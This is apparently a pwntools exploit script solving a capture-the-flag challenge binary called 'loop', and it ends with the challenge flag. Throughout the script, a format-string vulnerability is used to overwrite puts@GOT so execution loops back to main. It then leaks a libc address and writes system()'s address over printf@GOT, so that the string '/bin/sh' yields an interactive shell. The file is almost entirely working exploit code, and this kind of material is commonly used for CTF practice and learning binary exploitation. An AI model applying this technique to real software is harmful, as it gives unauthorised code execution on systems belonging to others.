from pwn import *
# p = process("./loop", env={"LD_PRELOAD":"./libc.so.6"}) # server
p = process("./loop")
# gdb.attach(p)

# LOOP ----------------------------------------------------------------
main_addr = 0x400805
puts_got = 0x601018					# value in 0x601018: 0x4005c6 x/gx
pl = '%2053c%14$hn----'				# 12 13
# 0x805 = 2053
pl += p64(puts_got)					# 14
p.sendline(pl)

# LEAK - parameter 17 = fgets_154 -------------------------------------
fgets_154 = 0x8584a		# server = 0x6dad0 + 154 (h) 6dad0 + 154 |  readelf -s libc.so.6 | grep fgets
sys_off = 0x55410		# server = 0x45390 | 			  readelf -s libc.so.6 | grep system


# p.sendline('123')
pl = '%17$p'
p.sendline(pl)
p.recvuntil('0x')

leak = int(p.recv(12) , 16)
print("leak address: ", hex(leak))

libc_base_address = leak - fgets_154
print("libc base address: ", hex(libc_base_address))

system_address = hex(libc_base_address + sys_off)
print("system address: ", system_address)

# WRITE ---------------------------------------------------------------
sys1 = int(system_address[-4:],16)
sys2 = int(system_address[-6:-4],16)
# print sys1
# print sys2
# sys1 = int(system_address[10:],16)
# sys2 = int(system_address[8:10],16)
# print sys1
# print sys2
printf_got = 0x601028
pl = '%' + str(sys2) + 'c%16$hhn' 			# 12 13
off = 16 - len(pl)
pl += off * '-'

pl1 = '%' + str(sys1 - sys2 - off) + 'c%17$hn'		# 14 15
pl1 += '-' * (16 - len(pl1)) 

pl += pl1
pl += p64(printf_got + 2) + p64(printf_got)
p.sendline(pl)

# CONTROL -------------------------------------------------------------
p.sendline('/bin/sh')

p.interactive()

# # WhiteHat{C0_L4m_Th1_M0i_C0_4n}
